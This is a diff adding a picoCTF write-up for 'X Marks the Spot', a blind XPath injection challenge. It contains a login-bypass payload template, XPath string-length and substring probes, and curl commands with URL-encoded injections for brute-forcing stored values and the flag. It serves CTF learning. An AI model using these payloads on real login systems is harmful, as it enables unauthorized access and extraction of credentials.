@@ -128,3 +128,74 @@ Which would query: `SELECT username, password FROM users WHERE username='adm'||'
 
 Which happens to be exactly 25 characters long.
 Navigate to filter.php to find the flag afterwards.
+
+
+<br />
+
+## X Marks the Spot
+
+**Challenge Link**
+
+http://mercury.picoctf.net:16521/
+<br />
+
+**Solution**
+
+This is a login bypass problem that uses XPath and blind injections.  I didn't know anything about XPath before this challenge, so first things first, research!
+
+I found this nice article that gave me XPath injections written for me, located at https://owasp.org/www-community/attacks/Blind_XPath_Injection
+
+<br />
+
+So first thing's first.  To test booleans on this site, we can use the following injection:
+```
+Username: anything
+Password: ' or [insert boolean]  or ''='a
+```
+If the site responds with "You're on the right path", the boolean is true.  If it returns false, the site responds with "Login failure."
+
+There are two booleans that I used during this challenge.
+```
+string-length(//user[position()=1]/child::node()[position()=2])=6 
+substring((//user[position()=1]/child::node()[position()=2]),1,1)="a"
+```
+Breaking down the first command, it basically checks if the length of the string in the `user` table at position [1,2] is 6.
+Breaking down the second command, it checks takes the first character of the string in the `user` table at position [1,2] is "a".
+
+A couple things to note about this is that indexes in XPath start with 1 and not 0, and that the substring method works like this:
+```
+substring(String to check, Index of First Character, Length of Substring)
+```
+
+You can use these two booleans to brute force the values of anything in the table.  By using these on a couple of locations, I found a few different values, like `thisisnottheflag`, `admin`, and `bob`.  Taking a hint from the name of this problem, I decided to go take the brute force route.
+
+You can convert the querys above into a curl command like the following:
+```
+curl -s -X Post http://mercury.picoctf.net:16521/ -d "name=admin&pass=[insert url encoded query]" | grep right
+```
+
+If the command prints out something along the lines of `You're on the right path`, that means it returned true.  If it didn't print anything at all, it returned false.
+
+Using this I made a python script (because I can't write a working bash script for some reason) to find which locations in the user table actually contained stuff.  The scripts won't be uploaded because they're messy and I may or may not have deleted them.
+
+```
+Example Command
+curl -s -X POST http://mercury.picoctf.net:16521/ -d name=admin&pass='%20or%20string-length(//user%5Bposition()=" + loc1 + "%5D/child::node()%5Bposition()=" + loc2 + "%5D)%3E0%20or%20''='a" | grep right
+loc1 and loc2 were variables I used to guess positions.
+If the cell at that location contained stuff, the length would be more than 0, so thats what this boolean checked.
+```
+
+Using this, I found that there the cells from positions [1-3][1-5] contained stuff.  Then I used another script that would brute force the first 6 characters for each of these 15 cells.
+```
+Example Command
+check = "curl -s -X POST http://mercury.picoctf.net:16521/ -d \"" + cmd + "\" | grep right"
+cmd = "name=admin&pass='%20or%20substring((//user%5Bposition()=" + pos1 + "%5D/child::node()%5Bposition()=" + pos2 + "%5D)," + str(loc1) + ",1)=%22" + letter + "%22%20%20or%20''='a"
+
+pos1 and pos2 were indexes in the table.  str(loc1) was the location/index in the string.  letter was the current letter that was being tested.  This was in python.
+```
+
+Using this I found that the one cell that contained the flag was in position [3,4].
+
+Then doing the same thing above, I found the length of the string in position [3,4], and used a script to brute force brute force every character in the 50 char long flag.
+
+Sorry for not uploading the scripts I used but they were just simple python for loops that used os.popen to run commands.
